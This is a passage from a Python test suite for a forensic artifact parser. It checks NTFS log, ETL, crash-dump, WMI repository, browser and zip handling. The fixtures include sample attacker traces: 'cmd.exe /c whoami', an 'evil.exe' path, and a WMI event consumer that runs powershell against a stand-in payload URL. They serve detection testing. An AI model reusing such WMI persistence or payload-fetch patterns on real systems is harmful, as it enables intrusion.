                    "conn.execute('INSERT INTO events VALUES (?, ?, ?, ?, ?)', ('Delete', '2026-05-10T13:10:00', 'C:\\\\Temp\\\\deleted.txt', '51-1', '102'))\n"
                    "conn.commit()\n"
                    "conn.close()\n"
                )

            command = f'{sys.executable} {backend_path} --logfile {{logfile}} --out {{output_dir}}'
            with patch.dict(os.environ, {'NTFS_LOG_TRACKER_CMD': command}, clear=True):
                events = list(parser.parse(file_path))

        self.assertEqual(len(events), 2)
        parent, child = events
        parent_extra = json.loads(parent.extra_fields)
        child_extra = json.loads(child.extra_fields)

        self.assertEqual(parent_extra['parser_status'], 'decoded')
        self.assertEqual(child.event_id, 'file_delete')
        self.assertEqual(child.target_path, r'C:\Temp\deleted.txt')
        self.assertEqual(child_extra['mft_reference'], '51-1')
        self.assertIn('missing_companion_mft', child_extra['parser_statuses'])
        self.assertIn('missing_companion_usnjrnl', child_extra['parser_statuses'])

    def test_ntfs_log_tracker_backend_error_falls_back_to_metadata_only(self):
        parser = NtfsMetadataParser(case_id=1, case_file_id=123)

        with tempfile.TemporaryDirectory() as tmpdir:
            file_path = os.path.join(tmpdir, '$LogFile')
            with open(file_path, 'wb') as handle:
                handle.write(b'RSTR')
            command = f'{sys.executable} -c "import sys; print(\'backend boom\', file=sys.stderr); sys.exit(5)"'
            with patch.dict(os.environ, {'NTFS_LOG_TRACKER_CMD': command}, clear=True):
                events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        event = events[0]
        raw_json = json.loads(event.raw_json)
        extra_fields = json.loads(event.extra_fields)

        self.assertEqual(event.artifact_type, 'ntfs_logfile')
        self.assertEqual(raw_json['parser_status'], 'backend_error')
        self.assertIn('backend boom', raw_json['parser_warning'])
        self.assertEqual(extra_fields['decoded_record_count'], 0)
        self.assertIn('backend_error', extra_fields['parser_statuses'])

    def test_legacy_filter_finds_ntfs_logfile_events(self):
        helper_spec = importlib.util.spec_from_file_location(
            'routes.hunting_query_helpers',
            os.path.join(os.path.dirname(os.path.dirname(__file__)), 'routes', 'hunting_query_helpers.py'),
        )
        helper_module = importlib.util.module_from_spec(helper_spec)
        helper_spec.loader.exec_module(helper_module)

        params = {}
        filter_sql = helper_module.build_hunting_type_filter('ntfs_logfile', params)

        self.assertIn('artifact_type_0', params)
        self.assertIn('artifact_type_1', params)
        self.assertEqual(params['artifact_type_0'], 'ntfs_logfile')
        self.assertEqual(params['artifact_type_1'], 'ntfs_logfile_event')
        self.assertIn('artifact_type IN', filter_sql)

    def test_diagnostic_log_parser_emits_clean_windows_etl_metadata(self):
        parser = DiagnosticLogParser(case_id=1)
        binary_payload = b'ETLTRACE\x00\x01\x02ExplorerStartupLog.etl\xff\xfe\xfd'

        with tempfile.NamedTemporaryFile('wb', suffix='.etl', delete=False) as handle:
            handle.write(binary_payload)
            file_path = handle.name
        try:
            with patch.object(parser, '_try_decode_etl_with_dissect', return_value={
                'decoder': None,
                'status': 'metadata_only',
                'warning': 'ETL metadata only; dissect.etl is not installed.',
                'total_records': 0,
                'decoded_record_count': 0,
                'skipped_record_count': 0,
                'records_limited': False,
                'children': [],
            }):
                events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        event = events[0]
        raw_json = json.loads(event.raw_json)
        extra_fields = json.loads(event.extra_fields)

        self.assertEqual(event.artifact_type, 'windows_etl')
        self.assertEqual(raw_json['legacy_artifact_type'], 'etl_trace')
        self.assertEqual(raw_json['parser_status'], 'metadata_only')
        self.assertEqual(extra_fields['parent_event_type'], 'etl_metadata')
        self.assertEqual(extra_fields['parser_status'], 'metadata_only')
        self.assertEqual(extra_fields['decoded_record_count'], 0)
        self.assertEqual(len(event.file_hash_sha256), 64)
        self.assertNotIn('sample', raw_json)
        self.assertNotIn('ETLTRACE', event.search_blob)
        self.assertNotIn('ExplorerStartupLog.etl', event.search_blob.replace(event.source_file, ''))

    def test_diagnostic_log_parser_emits_meaningful_dissect_etl_children(self):
        parser = DiagnosticLogParser(case_id=1, case_file_id=42)

        class FakeEtlEvent:
            def ts(self):
                return datetime(2026, 5, 8, 13, 54, 48)

            def provider_name(self):
                return 'Microsoft-Windows-PowerShell'

            def provider_id(self):
                return '11111111-2222-3333-4444-555555555555'

            def symbol(self):
                return 'TestEvent'

            def event_values(self):
                return {
                    'EventId': 7,
                    'Opcode': 'Start',
                    'Level': 'Informational',
                    'ProcessId': 123,
                    'ThreadId': 456,
                    'ImageName': r'C:\Windows\System32\cmd.exe',
                    'CommandLine': 'cmd.exe /c whoami',
                    'TargetFilename': r'C:\Users\Public\script.ps1',
                    'RawPayload': b'\x00\x01binary',
                }

        class FakeRecord:
            event = FakeEtlEvent()

        fake_dissect = types.ModuleType('dissect')
        fake_etl_module = types.ModuleType('dissect.etl')

        class FakeETL:
            def __init__(self, _handle):
                pass

            def __iter__(self):
                return iter([FakeRecord()])

        fake_etl_module.ETL = FakeETL
        binary_payload = b'ETLTRACE with fake decoder'

        with tempfile.NamedTemporaryFile('wb', suffix='.etl', delete=False) as handle:
            handle.write(binary_payload)
            file_path = handle.name
        try:
            with patch.dict(sys.modules, {'dissect': fake_dissect, 'dissect.etl': fake_etl_module}):
                events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 2)
        parent, child = events
        parent_extra = json.loads(parent.extra_fields)
        child_extra = json.loads(child.extra_fields)

        self.assertEqual(parent.artifact_type, 'windows_etl')
        self.assertEqual(parent_extra['parser_status'], 'decoded')
        self.assertEqual(parent_extra['decoder'], 'dissect.etl')
        self.assertEqual(parent_extra['decoded_record_count'], 1)
        self.assertEqual(child.artifact_type, 'windows_etl_event')
        self.assertEqual(child.provider, 'Microsoft-Windows-PowerShell')
        self.assertEqual(child.event_id, '7')
        self.assertEqual(child.process_name, 'cmd.exe')
        self.assertEqual(child.process_path, r'C:\Windows\System32\cmd.exe')
        self.assertEqual(child.process_id, 123)
        self.assertEqual(child.thread_id, 456)
        self.assertEqual(child.command_line, 'cmd.exe /c whoami')
        self.assertEqual(child.target_path, r'C:\Users\Public\script.ps1')
        self.assertEqual(child_extra['provider_category'], 'powershell')
        self.assertEqual(child_extra['payload']['ImageName'], r'C:\Windows\System32\cmd.exe')
        self.assertIn('RawPayload', child_extra['skipped_binary_fields'])
        self.assertNotIn('binary', child.search_blob)
        self.assertIn('cmd.exe /c whoami', child.search_blob)
        self.assertIn(r'C:\Windows\System32\cmd.exe', child.search_blob)

    def test_diagnostic_log_parser_falls_back_to_airbus_etl_parser(self):
        parser = DiagnosticLogParser(case_id=1, case_file_id=42)

        fake_etl_package = types.ModuleType('etl')
        fake_etl_module = types.ModuleType('etl.etl')

        class FakeObserver:
            pass

        class FakeAirbusEvent:
            timestamp = datetime(2026, 5, 8, 14, 10, 1)
            provider_name = 'Airbus-Test-Provider'
            provider_id = 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
            EventId = 99
            ProcessId = 222
            ThreadId = 333

            def parse_tracelogging(self):
                return {
                    'ImageName': r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
                    'CommandLine': 'powershell -NoProfile',
                    'OpaquePayload': b'\x00\x01binary',
                }

        class FakeAirbusReader:
            def parse(self, observer):
                observer.on_event_record(FakeAirbusEvent())

        def fake_build_from_stream(_data):
            return FakeAirbusReader()

        fake_etl_module.IEtlFileObserver = FakeObserver
        fake_etl_module.build_from_stream = fake_build_from_stream
        binary_payload = b'ETLTRACE with airbus fallback'

        with tempfile.NamedTemporaryFile('wb', suffix='.etl', delete=False) as handle:
            handle.write(binary_payload)
            file_path = handle.name
        try:
            with patch.object(parser, '_try_decode_etl_with_dissect', return_value={
                'decoder': 'dissect.etl',
                'status': 'unsupported_provider_payload',
                'warning': 'ETL metadata only: provider payload unsupported or not meaningful using dissect.etl.',
                'total_records': 1,
                'decoded_record_count': 0,
                'skipped_record_count': 1,
                'records_limited': False,
                'children': [],
            }):
                with patch.dict(sys.modules, {'etl': fake_etl_package, 'etl.etl': fake_etl_module}):
                    events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 2)
        parent, child = events
        parent_extra = json.loads(parent.extra_fields)
        child_extra = json.loads(child.extra_fields)

        self.assertEqual(parent_extra['decoder'], 'airbus.etl-parser')
        self.assertEqual(parent_extra['parser_status'], 'decoded')
        self.assertEqual(parent_extra['primary_decoder_status'], 'unsupported_provider_payload')
        self.assertEqual(child.artifact_type, 'windows_etl_event')
        self.assertEqual(child.provider, 'Airbus-Test-Provider')
        self.assertEqual(child.event_id, '99')
        self.assertEqual(child.process_id, 222)
        self.assertEqual(child.thread_id, 333)
        self.assertEqual(child_extra['decoder'], 'airbus.etl-parser')
        self.assertEqual(
            child_extra['payload']['message']['ImageName'],
            r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
        )
        self.assertNotIn('binary', child.search_blob)
        self.assertIn('powershell -NoProfile', child.search_blob)

    def test_wer_report_parser_extracts_application_fields(self):
        parser = WerReportParser(case_id=1)
        event_time = int((datetime(2026, 4, 25, 22, 0, 0) - datetime(1601, 1, 1)).total_seconds() * 10000000)

        with tempfile.NamedTemporaryFile('w', suffix='.wer', delete=False, encoding='utf-16-le') as handle:
            handle.write(
                f"Version=1\nEventType=APPCRASH\nEventTime={event_time}\n"
                "AppName=filezilla.exe\nAppPath=C:\\Program Files\\FileZilla FTP Client\\filezilla.exe\n"
                "Bucket=abc123\n"
            )
            file_path = handle.name
        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'windows_error_report')
        self.assertEqual(events[0].event_id, 'APPCRASH')
        self.assertEqual(events[0].process_name, 'filezilla.exe')
        self.assertIn('abc123', events[0].search_blob)

    def test_crash_dump_triage_parser_reads_minidump_header(self):
        parser = CrashDumpTriageParser(case_id=1)

        with tempfile.NamedTemporaryFile('wb', suffix='.dmp', delete=False) as handle:
            handle.write(struct.pack('<IIIIIIQ', 0x504D444D, 1, 1, 32, 0, 1710000000, 0))
            handle.write(struct.pack('<III', 4, 16, 44))
            handle.write(b'C:\\Temp\\evil.exe\x00')
            file_path = handle.name
        try:
            events = list(parser.parse(file_path))
        finally:
            os.remove(file_path)

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'crash_dump_triage')
        raw = json.loads(events[0].raw_json)
        self.assertEqual(raw['format'], 'minidump')
        self.assertEqual(raw['stream_count'], 1)

    def test_wbem_repository_parser_extracts_suspicious_strings(self):
        parser = WbemRepositoryParser(case_id=1)

        with tempfile.TemporaryDirectory() as tmpdir:
            repo_dir = os.path.join(tmpdir, 'C', 'Windows', 'System32', 'wbem', 'Repository')
            os.makedirs(repo_dir, exist_ok=True)
            file_path = os.path.join(repo_dir, 'OBJECTS.DATA')
            with open(file_path, 'wb') as handle:
                handle.write(b'ActiveScriptEventConsumer powershell.exe http://bad.example/payload')
            events = list(parser.parse(file_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].artifact_type, 'wbem_repository')
        self.assertIn('ActiveScriptEventConsumer', events[0].rule_title)
        self.assertIn('http://bad.example/payload', events[0].search_blob)

    def test_browser_cloud_and_sidecar_metadata_parsers_route_gap_files(self):
        registry = ParserRegistry()

        with tempfile.TemporaryDirectory() as tmpdir:
            browser_dir = os.path.join(tmpdir, 'C', 'Users', 'u', 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
            onedrive_dir = os.path.join(tmpdir, 'C', 'Users', 'u', 'AppData', 'Local', 'Microsoft', 'OneDrive', 'logs', 'Common')
            os.makedirs(browser_dir, exist_ok=True)
            os.makedirs(onedrive_dir, exist_ok=True)

            prefs_path = os.path.join(browser_dir, 'Preferences')
            with open(prefs_path, 'w', encoding='utf-8') as handle:
                json.dump({'profile': {'name': 'Default'}, 'extensions': {'settings': {'abc': {}}}}, handle)

            cloud_path = os.path.join(onedrive_dir, 'collector-url.txt')
            with open(cloud_path, 'w', encoding='utf-8') as handle:
                handle.write('https://client.wns.windows.com')

            sidecar_path = os.path.join(browser_dir, 'History.db-wal')
            with open(sidecar_path, 'wb') as handle:
                handle.write(b'SQLite WAL sidecar')

            browser_type, browser_parser = registry.resolve_parser_for_file(prefs_path, case_id=1)
            cloud_type, cloud_parser = registry.resolve_parser_for_file(cloud_path, case_id=1)
            sidecar_type, sidecar_parser = registry.resolve_parser_for_file(sidecar_path, case_id=1)
            browser_events = list(browser_parser.parse(prefs_path))
            cloud_events = list(cloud_parser.parse(cloud_path))
            sidecar_events = list(sidecar_parser.parse(sidecar_path))

        self.assertEqual(browser_type, 'browser_state')
        self.assertIsInstance(browser_parser, BrowserStateParser)
        self.assertEqual(json.loads(browser_events[0].raw_json)['extension_count'], 1)
        self.assertEqual(cloud_type, 'cloud_metadata')
        self.assertIsInstance(cloud_parser, CloudMetadataParser)
        self.assertIn('https://client.wns.windows.com', cloud_events[0].search_blob)
        self.assertEqual(sidecar_type, 'transaction_sidecar')
        self.assertIsInstance(sidecar_parser, TransactionSidecarParser)
        self.assertEqual(sidecar_events[0].artifact_type, 'transaction_sidecar')

    def test_zip_inspection_routes_deflate64_to_external_extractor(self):
        archive_extraction = importlib.import_module('utils.archive_extraction')

        class _FakeMember:
            filename = 'C/$MFT'
            compress_type = 9
            file_size = 1024

        class _FakeZip:
            def __enter__(self):
                return self

            def __exit__(self, exc_type, exc, tb):
                return False

            def infolist(self):
                return [_FakeMember()]

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch.object(archive_extraction.zipfile, 'ZipFile', return_value=_FakeZip()):
                inspection = archive_extraction.inspect_zip_archive('/tmp/kape.zip', tmpdir)

        self.assertTrue(inspection['requires_external_extractor'])
        self.assertEqual(inspection['unsupported_methods'], [9])
        self.assertEqual(inspection['total_uncompressed'], 1024)
        self.assertEqual(inspection['unsafe_members'], [])

    def test_zip_external_extractor_lookup_accepts_7zz(self):
        archive_extraction = importlib.import_module('utils.archive_extraction')

        with patch.object(archive_extraction.os.path, 'exists', return_value=False):
            with patch.object(archive_extraction.shutil, 'which') as which:
                which.side_effect = lambda command: '/usr/bin/7zz' if command == '7zz' else None

                self.assertEqual(archive_extraction.find_external_zip_extractor(), '/usr/bin/7zz')

    def test_chrome_cookies_parser_tolerates_missing_security_columns(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, 'Cookies')
            conn = sqlite3.connect(db_path)
            conn.execute(
                '''
                CREATE TABLE cookies (
                    host_key TEXT,
                    name TEXT,
                    path TEXT,
                    creation_utc INTEGER,
                    expires_utc INTEGER,
                    last_access_utc INTEGER
                )
                '''
            )
            conn.execute(
                '''
                INSERT INTO cookies
                    (host_key, name, path, creation_utc, expires_utc, last_access_utc)
                VALUES (?, ?, ?, ?, ?, ?)
                ''',
                ('example.com', 'session', '/', 13253760000000000, 13253760000000000, 13253760000000000),
            )
            conn.commit()
            conn.close()

            parser = BrowserSQLiteParser(case_id=7, source_host='host-1', case_file_id=99)
            parser._original_path = db_path
            events = list(parser._parse_chrome_cookies(db_path, 'Cookies', 'host-1'))

        self.assertEqual(len(events), 1)
        self.assertFalse(parser.errors)
        self.assertEqual(json.loads(events[0].raw_json)['secure'], False)

    def test_browser_state_target_path_uses_artifact_name_not_staging_path(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            profile_dir = os.path.join(tmpdir, 'Google', 'Chrome', 'User Data', 'Default')
            os.makedirs(profile_dir)
            pref_path = os.path.join(profile_dir, 'Preferences')
            with open(pref_path, 'w', encoding='utf-8') as handle:
                json.dump({'profile': {'name': 'Default'}, 'extensions': {'settings': {}}}, handle)

            parser = BrowserStateParser(case_id=7, source_host='BDALENE', case_file_id=99)
            events = list(parser.parse(pref_path))

        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].source_host, 'BDALENE')
        self.assertEqual(events[0].source_file, 'Preferences')
        self.assertEqual(events[0].target_path, 'Preferences')
        self.assertNotIn(tmpdir, events[0].target_path)

    def test_activities_cache_malformed_database_is_partial_warning(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            db_path = os.path.join(tmpdir, 'ActivitiesCache.db')
            with open(db_path, 'wb') as handle:
                handle.write(b'SQLite format 3\x00')

            parser = ActivitiesCacheParser(case_id=7, source_host='host-1', case_file_id=99)
            with patch.object(windows_module.sqlite3, 'connect', side_effect=sqlite3.DatabaseError('database disk image is malformed')):
                events = list(parser.parse(db_path))

        self.assertEqual(events, [])
        self.assertFalse(parser.errors)
        self.assertTrue(any('could not be fully parsed' in warning for warning in parser.warnings))

    def test_zip_extraction_enforces_uncompressed_size_limit(self):
        archive_extraction = importlib.import_module('utils.archive_extraction')

        class _FakeMember:
            filename = 'C/large.bin'
            compress_type = archive_extraction.zipfile.ZIP_STORED
            file_size = 2048

        class _FakeZip:
            def __enter__(self):
                return self

            def __exit__(self, exc_type, exc, tb):
                return False

            def infolist(self):
                return [_FakeMember()]

        with tempfile.TemporaryDirectory() as tmpdir:
            with patch.object(archive_extraction.zipfile, 'ZipFile', return_value=_FakeZip()):
                with self.assertRaisesRegex(ValueError, 'uncompressed size limit'):
                    archive_extraction.extract_zip_archive('/tmp/kape.zip', tmpdir, max_uncompressed_bytes=1024)


if __name__ == '__main__':
    unittest.main()
